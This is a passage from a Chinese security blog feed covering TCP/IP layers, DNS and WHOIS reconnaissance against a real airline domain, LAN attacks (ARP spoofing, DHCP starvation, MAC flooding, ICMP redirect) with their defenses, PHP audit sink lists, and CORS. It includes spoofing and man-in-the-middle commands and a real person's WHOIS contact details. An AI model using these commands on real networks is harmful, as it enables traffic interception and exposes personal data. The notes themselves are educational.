title="全流程"></a>全流程</h1><ul><li>链路层：对0和1进行分组，定义数据帧，确认主机的物理地址，传输数据；</li><li>网络层：定义IP地址，确认主机所在的网络位置，并通过IP进行MAC寻址，对外网数据包进行路由转发；</li><li>传输层：定义端口，确认主机上应用程序的身份，并将数据包交给对应的应用程序；</li><li>应用层：定义数据格式，并按照对应的格式解读数据。</li></ul><p><strong>用一句通俗易懂的话讲就是：</strong></p><p>当你输入一个网址并按下回车键的时候，首先，应用层协议对该请求包做了格式定义；紧接着传输层协议加上了双方的端口号，确认了双方通信的应用程序；然后网络协议加上了双方的IP地址，确认了双方的网络位置；最后链路层协议加上了双方的MAC地址，确认了双方的物理位置，同时将数据进行分组，形成数据帧，采用广播方式，通过传输介质发送给对方主机。而对于不同网段，该数据包首先会转发给网关路由器，经过多次转发后，最终被发送到目标主机。目标机接收到数据包后，采用对应的协议，对帧数据进行组装，然后再通过一层一层的协议进行解析，最终被应用层的协议解析并交给服务器处理。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;TCP/IP 协议栈是一系列网络协议的总和，是构成网络通信的核心骨架，它定义了电子设备如何连入因特网，以及数据如何在它们之间进行传输。&lt;/p&gt;
&lt;p&gt;TCP/IP采用四层结构，分别是应用层、传输层、网络层和链路层。&lt;/p&gt;
&lt;p&gt;每一层都需要他的下一层所提供的协议来完成自己
      
    
    </summary>
    
      <category term="网络及协议" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/"/>
    
    
  </entry>
  
  <entry>
    <title>信息收集--DNS、IP</title>
    <link href="http://yoursite.com/2018/12/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-DNS%E3%80%81IP/"/>
    <id>http://yoursite.com/2018/12/23/信息收集-DNS、IP/</id>
    <published>2018-12-23T05:50:40.000Z</published>
    <updated>2018-12-23T07:04:30.402Z</updated>
    
    <content type="html"><![CDATA[<p>域名系统（英文：Domain Name System，DNS）是因特网的一项服务，它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网。DNS 使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><p>当个人或者企业实体注册域名时需要注册许多信息，注册隐私的设置各种各样，我们可以搜集这些信息并用来验证IP空间。根据这个线索，可以寻找属于该个人或者企业实体的其他网站信息，甚至于核心员工的号码和地址。</p><h1 id="与DNS相关的命令使用"><a href="#与DNS相关的命令使用" class="headerlink" title="与DNS相关的命令使用"></a>与DNS相关的命令使用</h1><ul><li>Host（host domain，host-vdomain）</li><li>nslookup</li><li>dig</li><li>whois</li></ul><h1 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h1><h2 id="域名查询"><a href="#域名查询" class="headerlink" title="域名查询"></a>域名查询</h2><p>使用<code>whois</code>命令对域名进行查询。</p><p>例如：</p><pre><code>whois ceair.com</code></pre><p>从中信息中发现一个新域名：<code>ce-air.com</code></p><p>继续用whois进行查询</p><p>得到<code>Registrant Name:chenchang Registrant Organization:china easter, airlines Registrant Street:No 2550 Rd hongqiao Registrant City:shixiaqu Registrant State/Province:shanghaishi Registrant Postal Code:200335 Registrant Country:CN Registrant Phone:+86.13818632527 Registrant Phone Ext: Registrant Fax:+86.13818632527 Registrant Fax Ext: Registrant Email:cchen@ceair.com</code></p><p>其中有比较重要的邮箱、电话号码、姓名。</p><p>然后在<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a>中提供的几个反查工具中进一步查询。</p><p>又发现一个新域名</p><p><code>eaglevision-china.com</code></p><p>这样就可以获得很多有用信息。</p><h1 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h1><pre><code>nslookset type=Awww.ceair.com</code></pre><h1 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h1><pre><code>dig ceair.com</code></pre><p>查询NS记录：</p><pre><code>dig ceair.com NS</code></pre><p>查询TXT记录：</p><pre><code>dig +noall +answer ceair.com TXT</code></pre><h1 id="DNS子域名爆破工具"><a href="#DNS子域名爆破工具" class="headerlink" title="DNS子域名爆破工具"></a>DNS子域名爆破工具</h1><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p><pre><code>python .\subDomainsBrute.py --full -t 10 ceair.com</code></pre><p>通过子域名的爆破，可以进一步明确企业网络资产（有哪些域名、域名对应什么系统、域名集中的C段地址等等），这是攻击者、防御者都需要时刻关注的方面。</p><h1 id="利用多地Ping工具，查看域名真实IP"><a href="#利用多地Ping工具，查看域名真实IP" class="headerlink" title="利用多地Ping工具，查看域名真实IP"></a>利用多地Ping工具，查看域名真实IP</h1><p>一些站点为了能够让用户获得更好的体验与提高安全性，会采用CDN技术对网站进行加速，因此在使用nslookup等工具进行本地查询时，可能无法获取到网站的真实IP地址。</p><p>这种情况下，通常采用多个地点对网站进行访问，查看解析结果的方式来确定是否使用CDN。</p><p>在浏览器中输入<code>http://ping.chinaz.com/ceair.com</code></p><p>可以片中看出，该归属地、运营商、ASN数据等信息。</p><h1 id="针对部分IP进行信息收集"><a href="#针对部分IP进行信息收集" class="headerlink" title="针对部分IP进行信息收集"></a>针对部分IP进行信息收集</h1><p>通过上述两个步骤，可以将确定的集中在某一C段IP进行查询，确定是否属于该企业。</p><p>选取子域名爆破结果中多次出现的一个IP（C段）： <code>whois 218.1.115.23</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;域名系统（英文：Domain Name System，DNS）是因特网的一项服务，它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网。DNS 使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。
      
    
    </summary>
    
      <category term="信息收集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>网络及协议安全</title>
    <link href="http://yoursite.com/2018/12/23/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8/"/>
    <id>http://yoursite.com/2018/12/23/网络及协议安全/</id>
    <published>2018-12-23T05:37:28.000Z</published>
    <updated>2018-12-24T14:29:36.626Z</updated>
    
    <content type="html"><![CDATA[<h1 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h1><p>在网络中进行数据通信，在什么情况下发送什么样的数据，要有一定的规则，这些规则或者约定就是协议，也叫网络协议。</p><h2 id="协议的组成"><a href="#协议的组成" class="headerlink" title="协议的组成"></a>协议的组成</h2><ul><li>同步：实现顺序的详细说明</li><li>语法：发送数据或者控制信息的格式</li><li>语义：根据控制信息，做出的响应</li></ul><h1 id="ARP协议攻击和防御"><a href="#ARP协议攻击和防御" class="headerlink" title="ARP协议攻击和防御"></a>ARP协议攻击和防御</h1><h2 id="ARP协议漏洞"><a href="#ARP协议漏洞" class="headerlink" title="ARP协议漏洞"></a>ARP协议漏洞</h2><p>ARP协议是建立在信任局域网内所有节点的基础上的，他的效率很高。但是不安全。它是无状态的协议。他不会检查自己是否发过请求包，也不知道自己是否发过请求包。他也不管是否合法的应答，只要收到目标mac地址是自己的ARP reply或者ARP广播包（包括ARP reply和ARP request），<br>都会接受并缓存。</p><h2 id="ARP攻击原理"><a href="#ARP攻击原理" class="headerlink" title="ARP攻击原理"></a>ARP攻击原理</h2><p><strong>ARP欺骗攻击建立在局域网主机间相互信任的基础上的</strong></p><p>当A发广播询问：我想知道IP是192.168.0.3的硬件地址是多少？</p><p>此时B当然会回话：我是IP192.168.0.3我的硬件地址是mac-b，</p><p>可是此时IP地址是192.168.0.4的C也非法回了：我是IP192.168.0.3,我的硬件地址是mac-c。而且是大量的。</p><p>所以A就会误信192.168.0.3的硬件地址是mac-c，而且动态更新缓存表</p><p>这样主机C就劫持了主机A发送给主机B的数据，这就是ARP欺骗的过程。</p><p>假如C直接冒充网关，此时主机C会不停的发送ARP欺骗广播，大声说：我的ＩＰ是１９２.１６８.０.１，我的硬件地址是ｍａｃ－ｃ，</p><p>此时局域网内所有主机都被欺骗，更改自己的缓存表，此时Ｃ将会监听到整个局域网发送给互联网的数据报。</p><h2 id="ARP欺骗攻击的方式"><a href="#ARP欺骗攻击的方式" class="headerlink" title="ARP欺骗攻击的方式"></a>ARP欺骗攻击的方式</h2><ul><li>cain</li><li>arpspoof【<code>arpspoof -i eth0 -t 目标IP 网关IP</code>       # ARP欺骗】</li><li>ettercap</li></ul><h2 id="ARP攻击的症状"><a href="#ARP攻击的症状" class="headerlink" title="ARP攻击的症状"></a>ARP攻击的症状</h2><ul><li>打开网页很慢，甚至打不开</li><li>提示IP地址冲突</li><li>键入<code>arp -a</code>查看缓存表，如果发现网关的MAC地址发生了改变，或者发现有很多IP指向同一个物理地址</li></ul><h2 id="ARP攻击的检测"><a href="#ARP攻击的检测" class="headerlink" title="ARP攻击的检测"></a>ARP攻击的检测</h2><ul><li>通过命令查看主机的ARP表或路由器的ARP表</li><li>用wireshark抓包查看可以&lt;IP,MAC&gt;地址映射</li><li>ARP防火墙安全日志</li></ul><h2 id="ARP攻击的防御"><a href="#ARP攻击的防御" class="headerlink" title="ARP攻击的防御"></a>ARP攻击的防御</h2><ul><li>设置静态ARP缓存表</li><li>专用VLan</li><li>交换机端绑定</li><li>安装ARP防火墙</li><li>通过”arp -d“清除arp列表，重新访问（临时方法）</li><li>将DHCP服务器建立在网关上（ARP攻击一般先攻击网关）</li><li>实在不行使用代理</li></ul><h2 id="找出ARP病毒主机"><a href="#找出ARP病毒主机" class="headerlink" title="找出ARP病毒主机"></a>找出ARP病毒主机</h2><p>下载<code>NBTSCAN</code>，他可以扫描到PC的真实IP地址和MAC地址。</p><h1 id="DHCP协议攻击和防御"><a href="#DHCP协议攻击和防御" class="headerlink" title="DHCP协议攻击和防御"></a>DHCP协议攻击和防御</h1><h2 id="DHCP的工作流程"><a href="#DHCP的工作流程" class="headerlink" title="DHCP的工作流程"></a>DHCP的工作流程</h2><p> ①首先由客户端以广播方式发出“DHCP Discover”报文来寻找网络中的DHCP服务端。</p><p>②当服务端接收到来自客户端的“DHCP Discover”报文后，就在自己的地址池中查找是否有可提供的IP地址。如果有，服务端就将此IP地址做上标记，并用“DHCP Offer”报文将之发送回客户端。</p><p>③由于网络中可能会存在多台DHCP服务端，所以客户端可能会接收到多个“DHCP Offer”报文。此时客户端只选择最先到达的“DHCP Offer”，并再次以广播方式发送“DHCP Request”报文。一方面要告知它所选择的服务端，同时也要告知其它没有被选择的服务端，这样这些服务端就可以将之前所提供的IP地址收回。</p><p>④被选择的服务端接收到客户端发来的“DHCP Request”报文后，首先将刚才所提供的IP地址标记为已租用，然后向客户端发送一个“DHCP Ack”确认报文，该报文中包含有IP地址的有效租约以及默认网关和DNS服务器等网络配置信息。</p><p>当客户端收到“DHCP ACK”报文后，就成功获得了IP地址，完成了初始化过程。</p><h2 id="DHCP服务欺骗和报文泛洪攻击"><a href="#DHCP服务欺骗和报文泛洪攻击" class="headerlink" title="DHCP服务欺骗和报文泛洪攻击"></a>DHCP服务欺骗和报文泛洪攻击</h2><p>利用yersinia耗尽IP资源</p><pre><code>sending RAW packetsending DISCOVER packetcreating DHCPsending RELEASE packet</code></pre><h3 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h3><ul><li>DHCP Snooping功能只能防止假冒攻击，而无法防止耗尽攻击。这是由于耗尽攻击所采用的都是客户端正常发送的DHCP Discover报文，因而DHCP Snooping对其无能为力。</li><li>可以通过交换机的Port-Security(端口安全性)功能来防范耗尽攻击。因为Yersinia伪造的每个DHCPDiscover报文的源MAC地址都是不同的，在交换机中执行<code>showmac-address-table</code>命令查看MAC地址表，就会发现在攻击机所连接的端口上产生了大量的MAC地址表条目，我们可以限定每个端口的最大MAC地址数量。</li><li>DHCP VACL</li><li>启用ARP入侵检测功能</li><li>使用IP过滤功能</li><li>DHCP报文限速。</li></ul><h1 id="MAC泛洪攻击"><a href="#MAC泛洪攻击" class="headerlink" title="MAC泛洪攻击"></a>MAC泛洪攻击</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>交换机中存在着一张记录着MAC地址的表，为了完成数据的快速转发，该表具有自动学习机制；泛洪攻击即是攻击者利用这种学习机制不断发送不同的MAC地址给交换机，充满整个MAC表，此时交换机只能进行数据广播，攻击者凭此获得信息。</p><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><ul><li>伪造大量的未知MAC地址进行通信</li><li>MAC表就会被充满</li><li>正常主机的MAC地址老化之后，无法再添加到MAC表</li></ul><h2 id="攻击工具"><a href="#攻击工具" class="headerlink" title="攻击工具"></a>攻击工具</h2><p>进行MAC泛洪攻击的工具——macof：</p><ul><li>使交换机的MAC表溢出</li><li>对于以后收到的数据包以广播方式发送</li><li>泛洪之前就存在与交换机MAC表中的条目不会被覆盖，只能等到这些条目自然老化</li></ul><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ul><li>限制相应端口通信MAC地址数目</li><li>设置端口关闭定时器</li></ul><h1 id="IP源地址欺骗"><a href="#IP源地址欺骗" class="headerlink" title="IP源地址欺骗"></a>IP源地址欺骗</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>IP 欺骗技术就是伪造某台主机的IP地址的技术。通过IP 地址的伪装使得某台主机能够伪装另外的一台主机，而这台主机往往具有某种特权或者被另外的主机所信任。假设现在有一个合法用户(1.1.1.1)已经同服务器建立正常的连接，攻击者构造攻击的TCP数据，伪装自己的IP 为1.1.1.1，并向服务器发送一个带有RSI位的TCP数据段。服务器接收到这样的数据后，认为从1.1.1.1发送的连接有错误，就会清空缓冲区中建立好的连接。这时，如果合法用户1.1.1.1再发送合法数据，服务器就已经没有这样的连接了，该用户就必须从新开始建立连接。攻击时，伪造大量的IP地址，向目标发送RST数据，使服务器不对合法用户服务。虽然IP地址欺骗攻击有着相当难度，但我们应该清醒地意识到，这种攻击非常广泛，入侵往往从这种攻击开始。</p><ul><li>隐藏发送者身份</li><li>假冒其他计算机</li></ul><h2 id="IP欺骗原理"><a href="#IP欺骗原理" class="headerlink" title="IP欺骗原理"></a>IP欺骗原理</h2><p>只使用数据包中的目标地址进行路由转发，不对源地址进行真实性的验证。</p><p>IP地址被用来在网络和计算机之间发送及接收信息，因此，每个信息包里都包含了IP地址，这样双方才能发送到正确的对方，对方也才能知道来源是正确的。</p><p>当IP欺骗被使用的时候，包里面的就不再是真实的IP，取而代之的是伪造的IP地址，这样，看上去包就是由那个IP发出的，如果对方回复这个信息，那么数据将会被发送到伪造的IP上，除非黑客重定向该信息到一个真实的IP上。</p><h2 id="为什么要IP欺骗"><a href="#为什么要IP欺骗" class="headerlink" title="为什么要IP欺骗"></a>为什么要IP欺骗</h2><p>IP欺骗被用来从事非法活动，破坏网络安全，黑客使用IP欺骗就不会被抓到，还有一些黑客进行Dos攻击的时候，就可以隐藏真实的IP，这样攻击者就无法查到。IP欺骗有时候也可以用来被克隆某个内部网中的信息，这样有时候就可以避免开户名和密码验证而直接登录系统。</p><h2 id="IP源地址欺骗技术的应用"><a href="#IP源地址欺骗技术的应用" class="headerlink" title="IP源地址欺骗技术的应用"></a>IP源地址欺骗技术的应用</h2><ul><li>拒绝服务攻击</li><li>网络扫描【<code>nmap -D</code>用一组肉机IP地址掩盖真实地址、Spoofer、Yersina 】</li></ul><h2 id="IP源地址欺骗防御"><a href="#IP源地址欺骗防御" class="headerlink" title="IP源地址欺骗防御"></a>IP源地址欺骗防御</h2><ul><li>使用随机化的初始序列号</li><li>抛弃基于地址的信任策略：阻止IP欺骗攻击的一种容易的办法就是放弃以地址为基础的验证。不允许r类远程调用命令的使用;删除<code>.rhosts</code>文件;清空<code>/etc/hosts.equiv</code>文件。这将迫使所有用户使用其他远程通信手段，如Telnet、ssh、skey等等。</li><li>使用加密方法：在包发送到网络之前，我们可以对它进行加密。虽然加密过程要求适当改变目前的网络环境，但它将保证数据的完整性和真实性。【IPsec】</li><li>进行包过滤：可以配置路由器使其能够拒绝网络外部和本网内具有相同IP地址的连接请求。而且，当包的IP地址不在本网内，路由器不应该把本网主 机的包发送出去。</li><li>在路由转发表中查找对应的转发接口是否与入接口匹配（检查数据包的源）</li></ul><h1 id="ICMP重定向攻击"><a href="#ICMP重定向攻击" class="headerlink" title="ICMP重定向攻击"></a>ICMP重定向攻击</h1><h2 id="ICMP重定向"><a href="#ICMP重定向" class="headerlink" title="ICMP重定向"></a>ICMP重定向</h2><p><img src="https://img.colabug.com/2017/08/0846817c46cbc3b3347b66f0802b71ae.png" alt=""></p><p>如上图，当主机A向主机B发送一个请求时，先通过默认网关（路由R2）发起请求（蓝色虚线），而这时R2发现通过自己到达主机B并非最佳路径，通过路由R1到达主机B的路径更短，于是这时路由R2就会向主机A发送ICMP重定向报文，让主机A下次请求主机B时通过路由R1走，不要从路由R2走。这时主机A就会在自己的路由表中将到达主机B的下一跳地址改成路由R1。</p><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>正常的网关可以向主机发送重定向报文，那么我们只要伪造网关发送重定向报文，就能使得被攻击者在下次发起请求时将数据包发送至错误的网关。这样可以使被攻击者断网或者窃听其流量数据。</p><p><img src="https://img.colabug.com/2017/08/6520c392f8a148b6e912981090dbefe2.png" alt=""></p><p>攻击的关键点是要抓取到主机A向路由R1发送的数据包，在wlan下数据报都是广播发送，所以攻击者的网卡只需要开启混杂模式，就能抓取到主机A向路由R1发送的包。</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>冒充网关IP地址，向被攻击节点发送ICMP重定向报文（将指定的新路由器IP地址设置为攻击节点。）</p><p>被攻击节点接受到该报文后会进行限制条件检查。（选择攻击节点作为新路由器）</p><p>攻击节点可以开启路由转发充当中间人（全程嗅探监听）</p><h2 id="攻击实践"><a href="#攻击实践" class="headerlink" title="攻击实践"></a>攻击实践</h2><p>利用Netwox的第86号工具</p><pre><code>netwox 86 -f -&quot;host 192.168.1.105&quot; -g 192.168.1.100 -i 192.168.1.1</code></pre><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>网关端：</p><ul><li>关闭ICMP重定向</li><li>变长子网掩码划分网段</li><li>使用网络控制列表ACL和代理</li></ul><p>主机端：</p><ul><li>可以使用防火墙等过滤掉ICMP报文或使用反间谍软件监控。</li><li>结合防ARP、IP欺骗等进行防御</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;协议&quot;&gt;&lt;a href=&quot;#协议&quot; class=&quot;headerlink&quot; title=&quot;协议&quot;&gt;&lt;/a&gt;协议&lt;/h1&gt;&lt;p&gt;在网络中进行数据通信，在什么情况下发送什么样的数据，要有一定的规则，这些规则或者约定就是协议，也叫网络协议。&lt;/p&gt;
&lt;h2 id=&quot;协议的
      
    
    </summary>
    
      <category term="网络及协议" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP代码审计</title>
    <link href="http://yoursite.com/2018/12/20/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://yoursite.com/2018/12/20/PHP代码审计/</id>
    <published>2018-12-20T15:17:03.000Z</published>
    <updated>2018-12-20T15:26:13.586Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php代码执行"><a href="#php代码执行" class="headerlink" title="php代码执行"></a>php代码执行</h1><ul><li>eval()</li><li>assert()</li><li>preg_replace + ‘/e’</li><li>call_user_func()</li><li>call_user_func_array()</li><li>create_function</li><li>array_map()</li></ul><h1 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h1><ul><li>system()</li><li>passthru()</li><li>exec()</li><li>pcntl_exec()</li><li>shell_exec()</li><li>popen()</li><li>proc_open()</li><li>`(反单引号)</li><li>ob_start()</li><li>escapeshellcmd() // 该函数用于过滤</li></ul><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><ul><li><code>move_uploaded_file()</code></li><li>getimagesize() //验证文件头只要为GIF89a，就会返回真</li></ul><h1 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h1><ul><li>unlink()</li><li>session_destroy()</li></ul><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><ul><li>require()</li><li>include()</li><li>include_once()</li><li>require_once()</li></ul><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><ul><li>allow_url_include = on</li></ul><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><ul><li>hightlight_file($filename);</li><li>show_source($filename);</li><li>print_r(php_strip_whitespace($filename));</li><li>print_r(file_get_contents($filename));</li><li>readfile($filename);</li><li>print_r(file($filename)); // var_dump</li><li>fread(fopen(size);</li><li>include($filename); // 非php代码</li><li>include_once($filename); // 非php代码</li><li>require($filename); // 非php代码</li><li>require_once($filename); // 非php代码</li><li>print_r(fread(popen(“cat flag”, “r”), $size));</li><li>print_r(fgets(fopen($filename, “r”))); // 读取一行</li><li>fpassthru(fopen($filename, “r”)); // 从当前位置一直读取到 EOF</li><li>print_r(fgetcsv(fopen(size));</li><li>print_r(fgetss(fopen($filename, “r”))); // 从文件指针中读取一行并过滤掉 HTML 标记</li><li>print_r(fscanf(fopen(“flag”, “r”),”%s”));</li><li>print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</li></ul><h1 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h1><ul><li>print_r(glob(“*”)); // 列当前目录</li><li>print_r(glob(“/*”)); // 列根目录 print_r(scandir(“.”));</li><li>print_r(scandir(“/“));<br>  $d=opendir(“.”);while(false!==($f=readdir($d))){echo”$f\n”;}<br>  $d=dir(“.”);while(false!==($f=$d-&gt;read())){echo$f.”\n”;}</li></ul><h1 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h1><ul><li>$GLOBALS</li></ul><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><ul><li>extract()</li><li><code>import_request_variables()</code></li><li>parse_str()</li><li><code>mb_parse_str()</code></li><li>全局变量覆盖：<code>register_globals</code>为ON，$GLOBALS</li></ul><h1 id="php序列化函数"><a href="#php序列化函数" class="headerlink" title="php序列化函数"></a>php序列化函数</h1><ul><li>serialize()</li><li>unserialize()</li><li>ini_set(‘session.serialize_handler’, ‘php_serialize’);</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;php代码执行&quot;&gt;&lt;a href=&quot;#php代码执行&quot; class=&quot;headerlink&quot; title=&quot;php代码执行&quot;&gt;&lt;/a&gt;php代码执行&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;eval()&lt;/li&gt;
&lt;li&gt;assert()&lt;/li&gt;
&lt;li&gt;preg_repla
      
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
  </entry>
  
  <entry>
    <title>跨域资源共享CORS详解</title>
    <link href="http://yoursite.com/2018/12/18/%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%ABCORS%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2018/12/18/跨域资源共享CORS详解/</id>
    <published>2018-12-18T13:51:49.000Z</published>
    <updated>2018-12-18T14:13:03.682Z</updated>
    
    <content type="html"><![CDATA[<p>CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。</p><p>它允许浏览器向跨源服务器，发出<code>XMLHttpRequest</code>请求，从而克服了AJAX只能<strong>同源</strong>使用的限制。</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。</p><p>整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p><p>因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。</p><h1 id="两种请求"><a href="#两种请求" class="headerlink" title="两种请求"></a>两种请求</h1><p>浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p><p>只要同时满足以下两大条件，就属于简单请求。</p><pre><code>（1) 请求方法是以下三种方法之一：    HEAD    GET    POST（2）HTTP的头信息不超出以下几种字段：    Accept    Accept-Language    Content-Language    Last-Event-ID    Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain</code></pre><p>凡是不同时满足上面两个条件，就属于非简单请求。</p><p>浏览器对这两种请求的处理，是不一样的。</p><h2 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><p>对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个<strong>Origin</strong>字段。</p><p>下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个<strong>Origin</strong>字段。</p><pre><code>GET /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0...</code></pre><p>上面的头信息中，<strong>Origin</strong>字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p><p>如果<strong>Origin</strong>指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含<strong>Access-Control-Allow-Origin</strong>字段，就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。</p><p>如果<strong>Origin</strong>指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p><pre><code>Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: FooBarContent-Type: text/html; charset=utf-8</code></pre><p>上面的头信息之中，有三个与CORS请求相关的字段，都以<strong>Access-Control-</strong>开头。</p><h3 id="（1）Access-Control-Allow-Origin"><a href="#（1）Access-Control-Allow-Origin" class="headerlink" title="（1）Access-Control-Allow-Origin"></a>（1）Access-Control-Allow-Origin</h3><p>该字段是必须的。它的值要么是请求时<strong>Origin</strong>字段的值，要么是一个*，表示接受任意域名的请求。</p><h3 id="（2）Access-Control-Allow-Credentials"><a href="#（2）Access-Control-Allow-Credentials" class="headerlink" title="（2）Access-Control-Allow-Credentials"></a>（2）Access-Control-Allow-Credentials</h3><p>该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。</p><h3 id="（3）Access-Control-Expose-Headers"><a href="#（3）Access-Control-Expose-Headers" class="headerlink" title="（3）Access-Control-Expose-Headers"></a>（3）Access-Control-Expose-Headers</h3><p>该字段可选。CORS请求时，XMLHttpRequest对象的<strong>getResponseHeader()</strong>方法只能拿到6个基本字段：<strong>Cache-Control</strong>、<strong>Content-Language</strong>、<strong>Content-Type</strong>、<strong>Expires</strong>、<strong>Last-Modified</strong>、<strong>Pragma</strong>。如果想拿到其他字段，就必须在<strong>Access-Control-Expose-Headers</strong>里面指定。上面的例子指定，<code>getResponseHeader(&#39;FooBar&#39;)</code>可以返回FooBar字段的值。</p><h3 id="withCredentials-属性"><a href="#withCredentials-属性" class="headerlink" title="withCredentials 属性"></a>withCredentials 属性</h3><p>上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定<strong>Access-Control-Allow-Credentials</strong>字段。</p><pre><code>Access-Control-Allow-Credentials: true</code></pre><p>另一方面，开发者必须在AJAX请求中打开<strong>withCredentials</strong>属性。</p><pre><code>var xhr = new XMLHttpRequest();xhr.withCredentials = true;</code></pre><p>否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。</p><p>但是，如果省略withCredentials设置，有的浏览器还是会一起发送Cookie。这时，可以显示关闭<strong>withCredentials</strong>。</p><pre><code>xhr.withCredentials = false;</code></pre><p>需要注意的是，如果要发送Cookie，<strong>Access-Control-Allow-Origin</strong>就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。</p><h2 id="非简单请求"><a href="#非简单请求" class="headerlink" 